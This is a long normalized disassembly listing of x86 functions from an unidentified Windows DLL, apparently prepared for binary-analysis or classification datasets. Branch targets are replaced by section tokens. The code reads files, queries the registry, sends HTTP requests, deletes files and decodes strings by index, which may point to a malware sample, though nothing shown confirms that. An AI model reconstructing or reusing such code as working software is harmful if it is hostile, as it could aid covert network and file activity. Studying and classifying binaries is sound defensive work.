mov [ eax + 0x4 ] edi
mov edi [ ebp - 0xec ]
mov [ eax + 0x8 ] edi
mov edi [ ebp - 0xe8 ]
mov [ eax + 0xc ] edi
mov edi [ ebp - 0x10c ]
push 0x2
sub esp 0x10
mov eax esp
mov [ eax ] edi
mov edi [ ebp - 0x108 ]
mov [ eax + 0x4 ] edi
mov edi [ ebp - 0x104 ]
mov ecx [ ebp - 0xc0 ]
mov [ eax + 0x8 ] edi
mov edi [ ebp - 0x100 ]
mov edx [ ecx ]
mov [ eax + 0xc ] edi
mov edi [ ebp - 0x12c ]
sub esp 0x10
mov eax esp
mov [ eax ] edi
mov edi [ ebp - 0x128 ]
mov [ eax + 0x4 ] edi
mov edi [ ebp - 0x124 ]
mov [ eax + 0x8 ] edi
mov edi [ ebp - 0x120 ]
mov [ eax + 0xc ] edi
mov eax [ ebp - 0xbc ]
push 0x6
push eax
mov eax [ ebp - 0xc8 ]
push eax
push ecx
mov ecx [ edx + 0x44 ]
call ecx
lea edi [ ebp - 0xd4 ]
mov [ ebp - 0xc8 ] eax
call sub_10005b80
lea edx [ ebp - 0x144 ]
push edx
call esi
lea eax [ ebp - 0x154 ]
push eax
call esi
lea ecx [ ebp - 0x164 ]
push ecx
mov [ ebp - 0x4 ] bl
call esi
mov eax [ ebp - 0xc0 ]
push eax
cmp [ ebp - 0xc8 ] ebx
jge r-xdata
sub_100683b0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax edx
push esi
lea esi [ eax + 0x1 ]
lea esp [ esp ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
push eax
push edx
push r--data
call sub_1004dd10
add esp 0xc
pop esi
pop ebp
retn
sub_100683e0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp edi esi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
mov eax [ edi + 0x8 ]
mov [ esi + 0x8 ] eax
mov ecx [ edi + 0x28 ]
push 0xffffffff
mov [ esi + 0x28 ] ecx
mov edx [ edi + 0x48 ]
push 0x0
lea eax [ edi + 0x2c ]
push eax
lea ecx [ esi + 0x2c ]
mov [ esi + 0x48 ] edx
call sub_1001c310
mov ecx [ edi + 0x4c ]
mov [ esi + 0x4c ] ecx
mov edx [ edi + 0x50 ]
mov [ esi + 0x50 ] edx
mov eax [ edi + 0x58 ]
mov [ esi + 0x58 ] eax
mov ecx [ edi + 0x5c ]
mov [ esi + 0x5c ] ecx
mov edx [ edi + 0x68 ]
mov [ esi + 0x68 ] edx
mov eax [ edi + 0x6c ]
mov [ esi + 0x6c ] eax
sub_10068440
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebx ]
push edi
xor edi edi
cmp esi edi
je r-xdata
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
mov [ ebx ] eax
cmp eax edi
jne r-xdata
cmp [ esi + 0x4 ] edi
je r-xdata
mov esi eax
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn 0x4
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
mov [ esi + 0x4 ] eax
mov esi eax
cmp esi edi
jne r-xdata
mov esi [ esi + 0x4 ]
cmp [ esi + 0x4 ] edi
jne r-xdata
xor ebx ebx
mov edx [ ebp + 0x8 ]
mov [ ebx ] edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] edi
mov [ ebx + 0xc ] edi
mov [ ebx + 0x10 ] edi
mov [ ebx + 0x14 ] edi
mov [ ebx + 0x1c ] edi
mov [ ebx + 0x20 ] edi
call sub_1005d1f0
jmp r-xdata
push 0x24
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ebx eax
cmp ebx edi
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
pop ebp
retn 0x4
mov [ esi + 0x4 ] edi
pop edi
pop esi
xor eax eax
pop ebx
pop ebp
retn 0x4
mov [ esi ] ebx
cmp ebx edi
je r-xdata
sub_100684f0
push ebp
mov ebp esp
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi ecx
call sub_1000dd40
test eax eax
je r-xdata
mov ecx edi
call sub_100646a0
test eax eax
je r-xdata
lea edx [ ebp - 0x50 ]
mov eax 0x12c
call sub_1000a6f0
mov eax 0x1
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx edi
call sub_1005de80
test eax eax
je r-xdata
lea edx [ ebp - 0x58 ]
mov eax 0x116
call sub_1000a6f0
mov eax 0x2
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx edi
call sub_1001baf0
test eax eax
je r-xdata
lea edx [ ebp - 0x60 ]
mov eax 0x84
call sub_1000a6f0
mov esi edi
call sub_1003e080
test eax eax
je r-xdata
lea edx [ ebp - 0x60 ]
mov eax 0x30
call sub_1000a6f0
mov eax 0x4
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
call sub_100156c0
test eax eax
jne r-xdata
lea edx [ ebp - 0x60 ]
mov eax 0xb5
call sub_1000a6f0
mov eax 0x5
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x60 ]
mov eax 0xd4
call sub_1000a6f0
mov eax 0x6
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
call sub_10030360
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_10068620
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push esi
push ebx
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push esi
push ebx
push eax
mov [ edi + 0x4 ] eax
call sub_10078600
add esp 0xc
pop esi
retn
push eax
call [ LocalFree@IAT ]
mov [ edi + 0x4 ] 0x0
sub_10068660
push ebp
mov ebp esp
push 0xffffffff
push sub_10082368
mov eax [ fs : 0x0 ]
push eax
sub esp 0x50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
xor edi edi
push edi
push 0x80
push 0x3
push edi
push edi
push 0x80000000
push eax
mov [ ebp - 0x44 ] ecx
call [ CreateFileW@IAT ]
mov esi eax
mov [ ebp - 0x38 ] esi
cmp esi 0xffffffff
jne r-xdata
push edi
push esi
call [ GetFileSize@IAT ]
mov ecx eax
cmp ecx 0xffffffff
jne r-xdata
lea eax [ edi + 0x1 ]
jmp r-xdata
mov eax 0xaaaaaaab
mul ecx
shr edx 0x1
lea edx [ edx + edx * 2 ]
mov eax ecx
sub eax edx
je r-xdata
push esi
call [ CloseHandle@IAT ]
mov eax 0x2
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov eax 0xaaaaaaab
mul ecx
push edi
shr edx 0x1
push edi
add edx edx
push edi
add edx edx
push esi
mov [ ebp - 0x5c ] edx
mov [ ebp - 0x40 ] edi
mov [ ebp - 0x3c ] edi
call [ SetFilePointer@IAT ]
cmp eax 0xffffffff
je r-xdata
inc ecx
mov eax 0xaaaaaaab
mul ecx
shr edx 0x1
lea edx [ edx + edx * 2 ]
mov eax ecx
sub eax edx
jne r-xdata
push esi
call [ CloseHandle@IAT ]
mov eax 0x3
jmp r-xdata
nop
push esi
call [ CloseHandle@IAT ]
mov eax 0x43
jmp r-xdata
mov edx eax
call sub_10017130
test al 0x3
je r-xdata
shr eax 0x2
lea edi [ eax + eax * 2 ]
mov [ ebp - 0x54 ] edi
mov edi edi
mov edi edi
lea ecx [ ebp - 0x3c ]
push ecx
call sub_1000b569
add esp 0x4
cmp [ ebp - 0x3c ] 0x0
je r-xdata
push edi
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ebx eax
dec eax
test al 0x3
jne r-xdata
push ebx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push esi
call [ CloseHandle@IAT ]
mov eax 0x4
jmp r-xdata
mov edi [ ebp - 0x48 ]
test edi edi
je r-xdata
push ebx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push 0x4
lea ecx [ ebp - 0x3c ]
lea esi [ ebp - 0x30 ]
call sub_1006a560
add esp 0x4
mov ecx [ ebp - 0x44 ]
mov edi [ ebp - 0x58 ]
add ecx 0xa0
push ecx
xor ebx ebx
mov ecx eax
mov edx edi
mov [ ebp - 0x4 ] ebx
call sub_1003a850
lea ecx [ ebp - 0x30 ]
mov esi eax
mov [ ebp - 0x4 ] 0xffffffff
call sub_10021250
cmp esi 0x42
je r-xdata
test ebx ebx
je r-xdata
mov edx [ ebp - 0x38 ]
push ebx
push ebx
push ebx
mov [ edi + 0xd4 ] bl
push edx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x3c ] ebx
call [ SetFilePointer@IAT ]
mov esi [ ebp - 0x38 ]
cmp eax 0xffffffff
jne r-xdata
cmp esi 0x43
jne r-xdata
push ebx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push esi
call [ CloseHandle@IAT ]
mov eax 0x5
jmp r-xdata
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x50 ]
call sub_100163c0
test eax eax
jne r-xdata
mov edi [ ebp - 0x44 ]
call sub_10036490
mov [ ebp - 0x58 ] eax
test eax eax
je r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0x1
call sub_100328b0
mov eax [ ebp - 0x38 ]
push eax
call [ CloseHandle@IAT ]
xor eax eax
jmp r-xdata
mov esi [ ebp - 0x38 ]
mov ecx [ ebp - 0x4c ]
mov edi [ GetProcessHeap@IAT ]
push ecx
push eax
call edi
mov esi [ HeapFree@IAT ]
push eax
call esi
mov edx [ ebp - 0x40 ]
mov eax [ ebp - 0x48 ]
mov ecx [ ebp - 0x44 ]
push edx
mov edx [ ebp - 0x5c ]
push eax
push ebx
push ecx
mov ecx [ ebp - 0x3c ]
call sub_10010790
test eax eax
jne r-xdata
push ebx
push 0x0
call edi
push eax
call esi
mov ecx [ ebp - 0x38 ]
push ecx
call [ CloseHandle@IAT ]
mov eax 0x6
mov edx [ ebp - 0x50 ]
add [ ebp - 0x40 ] edx
mov esi [ ebp - 0x38 ]
mov edi [ ebp - 0x54 ]
jmp r-xdata
xor eax eax
push eax
lea edx [ ebp - 0x48 ]
push edx
push edi
push ebx
push esi
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4c ] eax
call [ ReadFile@IAT ]
test eax eax
je r-xdata
sub_10068940
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
cmp [ ebx ] 0x0
push edi
mov edi [ rw-data ]
jne r-xdata
add edi 0xd4
push esi
lea eax [ ebp - 0x4 ]
mov ecx edi
call sub_1004d750
mov esi [ eax ]
mov eax [ rw-data ]
cmp esi [ eax + 0xd8 ]
jne r-xdata
pop edi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi + 0xc ]
push eax
call [ UnmapViewOfFile@IAT ]
mov ecx [ esi + 0x10 ]
push ecx
call [ CloseHandle@IAT ]
push esi
lea edx [ ebp - 0x4 ]
push edx
push edi
mov [ ebx ] 0x0
call sub_1005b660
pop esi
pop edi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
pop esi
pop edi
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
sub_100689c0
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x71c71c7
ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10052185
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
call sub_1002050e
lea eax [ ecx + ecx * 8 ]
add eax eax
add eax eax
push eax
call sub_1005ac7e
add esp 0x4
test eax eax
jne r-xdata
sub_10068a30
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x10 ]
push edi
cmp esi 0x4
jb r-xdata
test esi esi
je r-xdata
mov eax [ edx ]
cmp eax [ ecx ]
jne r-xdata
pop edi
xor eax eax
pop esi
pop ebp
retn
movzx eax [ edx ]
movzx edi [ ecx ]
sub eax edi
jne r-xdata
sub esi 0x4
add ecx 0x4
add edx 0x4
cmp esi 0x4
jae r-xdata
sar eax 0x1f
pop edi
or eax 0x1
pop esi
pop ebp
retn
cmp esi 0x1
jbe r-xdata
movzx eax [ edx + 0x1 ]
movzx edi [ ecx + 0x1 ]
sub eax edi
jne r-xdata
cmp esi 0x2
jbe r-xdata
movzx eax [ edx + 0x2 ]
movzx edi [ ecx + 0x2 ]
sub eax edi
jne r-xdata
cmp esi 0x3
jbe r-xdata
movzx eax [ edx + 0x3 ]
movzx ecx [ ecx + 0x3 ]
sub eax ecx
sub_10068ab0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x14 ]
push edi
call sub_10072240
inc [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
mov edi [ ebp + 0x10 ]
mov ecx [ esi ]
sub eax edi
lea edx [ eax * 4 - 0x4 ]
lea ecx [ ecx + edi * 4 ]
push edx
push ecx
add ecx 0x4
push ecx
call sub_10077d10
mov eax [ esi ]
mov ecx [ ebp + 0xc ]
add esp 0xc
mov [ eax + edi * 4 ] ecx
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10068b00
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
mov edx [ esi + 0x4 ]
push eax
push ecx
push edx
call [ lstrlenW@IAT ]
mov ecx [ esi ]
push eax
mov eax [ esi + 0x4 ]
push eax
push ecx
call [ HttpSendRequestW@IAT ]
pop esi
test eax eax
jne r-xdata
mov eax 0x1
pop ebp
retn 0x8
push eax
call sub_1002f000
add esp 0x4
xor eax eax
pop ebp
retn 0x8
sub_10068b50
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_1002f85f
mov [ esi ] al
inc esi
add esp 0x8
cmp esi ebx
jne r-xdata
pop edi
sub_10068b80
push ebp
mov ebp esp
sub esp 0x6ac
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov esi ecx
mov edi edx
mov [ ebp - 0x6ac ] edi
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
test edi edi
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push ebx
lea edx [ ebp - 0x6a8 ]
mov eax 0x1
call sub_10049510
lea edx [ ebp - 0x6a4 ]
xor eax eax
call sub_10049510
lea edx [ ebp - 0x6a0 ]
mov eax 0x4
call sub_10049510
mov eax edx
push eax
push esi
call [ StrStrW@IAT ]
lea ecx [ ebp - 0x69c ]
test eax eax
mov edx 0x30c
mov eax ecx
je r-xdata
xor ebx ebx
sub esi ecx
nop
lea ebx [ ebp - 0x6a4 ]
xor edi edi
sub ebx ecx
lea esp [ esp ]
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ ebx + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
test ebx ebx
je r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
xor edx edx
mov [ eax ] dx
test edi edi
jne r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea eax [ ebp - 0x6a0 ]
push eax
mov esi 0x30c
lea ebx [ ebp - 0x69c ]
call sub_10030af0
test eax eax
jne r-xdata
pop ebx
pop edi
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
pop ebx
pop edi
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push esi
mov esi 0x30c
lea ebx [ ebp - 0x69c ]
call sub_10030af0
test eax eax
jne r-xdata
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
lea ecx [ ebp - 0x6a0 ]
push ecx
push edi
call [ StrStrW@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x6a4 ]
push eax
call sub_10030af0
test eax eax
je r-xdata
push edi
mov esi 0x30c
lea ebx [ ebp - 0x69c ]
call sub_10030af0
test eax eax
jne r-xdata
lea edx [ ebp - 0x6a4 ]
push edx
call sub_10030af0
test eax eax
jne r-xdata
mov edi [ ebp - 0x6ac ]
lea eax [ ebp - 0x6a0 ]
push eax
push edi
call [ StrStrW@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0x6a8 ]
push edx
mov esi 0x30c
lea ebx [ ebp - 0x69c ]
call sub_10030af0
test eax eax
jne r-xdata
lea ecx [ ebp - 0x6a4 ]
push ecx
call sub_10030af0
test eax eax
jne r-xdata
lea eax [ ebp - 0x6a0 ]
push eax
call sub_10030af0
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_10030af0
test eax eax
jne r-xdata
lea edx [ ebp - 0x84 ]
mov eax 0x2
call sub_10049510
lea edx [ ebp - 0x6a8 ]
push edx
push 0x20119
push 0x0
lea eax [ ebp - 0x84 ]
push eax
push 0x80000002
call [ RegOpenKeyExW@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x6a8 ]
push ecx
mov edx ebx
push edx
call sub_10028980
add esp 0x8
pop ebx
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_10068dfd
push 0x58
mov eax sub_1007e47b
call sub_10007703
mov esi [ ebp + 0x14 ]
test [ esi + 0x14 ] 0x4000
mov edi [ ebp + 0x8 ]
mov al [ ebp + 0x18 ]
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x54 ] edi
mov [ ebp - 0x50 ] al
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
mov ecx esi
call sub_10009450
xor ebx ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_100519c6
pop ecx
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x58 ] eax
call sub_1002a730
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
mov ecx [ ebp - 0x58 ]
xor edi edi
inc edi
lea eax [ ebp - 0x48 ]
mov [ ebp - 0x4 ] edi
push eax
cmp [ ebp + 0x1c ] bl
je r-xdata
movzx edx [ ebp + 0x1c ]
mov eax [ ecx ]
push edx
push [ ebp - 0x50 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call [ eax + 0x1c ]
mov eax edi
jmp r-xdata
call sub_10020962
mov [ ebp - 0x4 ] 0x3
call sub_10039e87
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
call sub_10019c00
retn 0x18
xor edi edi
jg r-xdata
push eax
lea ecx [ ebp - 0x2c ]
call sub_100172f0
push ebx
push edi
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
call sub_1001c5c0
mov eax [ esi + 0x20 ]
cmp [ esi + 0x24 ] ebx
jl r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
push edi
push [ ebp - 0x50 ]
lea eax [ ebp - 0x64 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ebp - 0x4c ]
call sub_1000a47d
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x10 ] eax
xor edi edi
cmp eax [ ebp - 0x1c ]
jbe r-xdata
cmp eax ebx
jbe r-xdata
push [ ebp - 0x1c ]
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0x5c ]
push [ ebp + 0xc ]
push eax
push [ ebp - 0x4c ]
call sub_1003fc32
mov ecx [ eax ]
push edi
push [ ebp - 0x50 ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
push eax
push ecx
push [ ebp - 0x54 ]
mov [ ebp + 0x10 ] eax
push [ ebp - 0x4c ]
mov [ esi + 0x20 ] ebx
mov [ esi + 0x24 ] ebx
call sub_1000a47d
add esp 0x30
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1001c5c0
mov eax [ ebp - 0x54 ]
lea eax [ ebp - 0x2c ]
sub eax [ ebp - 0x1c ]
mov edi eax
jmp r-xdata
mov eax [ esi + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
sub_10068f58
mov edi edi
push ebp
mov ebp esp
fldz
mov eax [ ebp + 0x8 ]
fcomp [ eax ]
fnstsw ax
test ah 0x41
jpe r-xdata
xor eax eax
pop ebp
retn
xor eax eax
inc eax
pop ebp
retn
sub_10068f90
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x8 ]
call edx
cmp [ esi + 0x8 ] 0x0
je r-xdata
xor eax eax
pop esi
retn
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
cmp [ esi + 0x84 ] 0x8
lea eax [ esi + 0x70 ]
jb r-xdata
push eax
call [ DeleteFileW@IAT ]
pop esi
retn
mov eax [ eax ]
sub_10068fc9
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100279e4
add esp 0x18
pop ebp
retn
sub_10068fe9
push 0x14
mov eax sub_1007e60b
call sub_10050d0f
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100067d1
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007a60
mov ecx [ ebp + 0x8 ]
push eax
call sub_100033a0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1002470e
mov eax edi
call sub_1001a1b3
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10040bd2
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_1001c4b0
push edi
call sub_10009b69
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_10036aac
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002050e
sub_10069090
push ebp
mov ebp esp
push esi
mov esi [ rw-data ]
mov ecx [ esi + 0x10 ]
mov eax [ esi + 0xc ]
cmp eax ecx
je r-xdata
or eax 0xffffffff
pop esi
pop ebp
retn
mov edx [ ebp + 0x8 ]
cmp eax ecx
jne r-xdata
add eax 0x8
cmp eax ecx
jne r-xdata
mov edx ecx
add eax 0x8
cmp eax edx
je r-xdata
cmp [ eax ] edx
je r-xdata
add [ esi + 0x10 ] 0xfffffff8
xor eax eax
pop esi
pop ebp
retn
lea ecx [ eax - 0x8 ]
push edi
lea esp [ esp ]
mov edi [ eax ]
mov [ ecx ] edi
mov edi [ eax + 0x4 ]
mov [ ecx + 0x4 ] edi
add eax 0x8
add ecx 0x8
cmp eax edx
jne r-xdata
pop edi
sub_100690f0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi + 0x4 ]
push edi
inc eax
push eax
push ecx
call sub_10024af0
mov edx [ esi + 0x4 ]
mov edi eax
mov eax [ esi ]
push edx
push eax
push edi
call sub_10078600
mov ecx [ esi + 0x4 ]
add esp 0x14
mov [ edi + ecx ] 0x0
mov eax edi
pop edi
pop esi
pop ebp
retn
sub_10069130
push ebp
mov ebp esp
sub esp 0x110
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx ecx
push esi
mov esi [ ebx + 0x4 ]
push edi
mov [ ebp - 0xdc ] ebx
mov [ ebp - 0xfc ] eax
mov [ ebp - 0xd8 ] 0x0
test esi esi
jne r-xdata
mov ecx [ ebx + 0x14 ]
mov [ ebp - 0xe4 ] ecx
test ecx ecx
jne r-xdata
lea edx [ ebp - 0xb0 ]
mov eax 0xe7
call sub_1001bb80
lea eax [ esi + 0x1 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov eax [ eax ]
lea ecx [ eax + 0x128 ]
add eax 0x12c
mov [ ebp - 0xe8 ] eax
lea edx [ ebp - 0x10 ]
mov eax 0x94
mov [ ebp - 0xe0 ] ecx
call sub_1001bb80
lea edx [ ebp - 0x1c ]
mov eax 0xe
call sub_1001bb80
lea edx [ ebp - 0x40 ]
mov eax 0x8e
call sub_1001bb80
lea edx [ ebp - 0x50 ]
mov eax 0x6
call sub_1001bb80
lea edx [ ebp - 0x60 ]
mov eax 0xb1
call sub_1001bb80
lea edx [ ebp - 0x74 ]
mov eax 0xfe
call sub_1001bb80
mov edi [ lstrcmpW@IAT ]
lea edx [ ebp - 0x10 ]
push edx
push esi
call edi
test eax eax
jne r-xdata
lea edx [ ebp - 0xb4 ]
lea eax [ ecx + 0x3d ]
call sub_1001bb80
mov eax 0x4
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1c ]
push ecx
push esi
call edi
test eax eax
jne r-xdata
mov eax [ ebp - 0xe4 ]
dec eax
je r-xdata
lea edx [ ebp - 0x40 ]
push edx
push esi
call edi
test eax eax
jne r-xdata
lea edx [ ebp - 0xd4 ]
mov eax 0x3b
jmp r-xdata
lea esi [ ebp - 0xf0 ]
mov ecx ebx
call sub_1001cc00
mov ecx [ ebp - 0xe8 ]
mov esi [ ecx ]
mov eax [ eax ]
mov [ ebp - 0xe4 ] eax
test esi esi
je r-xdata
dec eax
je r-xdata
lea ecx [ ebp - 0x50 ]
push ecx
push esi
call edi
test eax eax
jne r-xdata
mov eax [ ebp - 0xe4 ]
sub eax 0x0
je r-xdata
call sub_1001bb80
xor esi esi
mov edx [ ebp - 0xe4 ]
mov eax [ esi ]
mov ecx [ edx ]
mov eax [ eax ]
push ecx
push eax
call edi
test eax eax
je r-xdata
lea esi [ ebp - 0x10c ]
mov ecx ebx
call sub_10007340
mov ebx [ eax ]
mov eax [ ebp - 0xe0 ]
call sub_10022f10
lea edi [ ebp - 0x10c ]
mov esi eax
call sub_10014890
test esi esi
jne r-xdata
lea edx [ ebp - 0xd4 ]
mov eax 0x10
jmp r-xdata
lea edx [ ebp - 0x60 ]
push edx
push esi
call edi
test eax eax
je r-xdata
mov eax [ ebp - 0xe4 ]
sub eax 0x0
je r-xdata
mov ecx [ ebp - 0xd8 ]
lea edx [ ebp - 0x30 ]
mov eax 0x38
mov [ ebx + 0x8 ] ecx
call sub_1001bb80
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x30 ]
push edx
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push esi
lea ecx [ ebp - 0x30 ]
push ecx
push eax
mov [ ebx + 0xc ] eax
call sub_10078600
mov edx [ ebp - 0xfc ]
mov edi [ edx ]
add esp 0xc
push ebx
add edi 0x138
call sub_1004c1c0
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
push eax
call [ LocalFree@IAT ]
mov [ ebx + 0xc ] 0x0
lea edx [ ebp - 0x9c ]
mov eax 0x6b
call sub_1001bb80
mov [ ebp - 0xd8 ] 0x3
jmp r-xdata
lea esi [ ebp - 0xf8 ]
mov ecx ebx
call sub_1001cc00
mov esi [ eax ]
lea edi [ ebp - 0xf8 ]
call sub_10065690
mov eax [ ebp - 0xe8 ]
push esi
call sub_10028a90
jmp r-xdata
test esi esi
je r-xdata
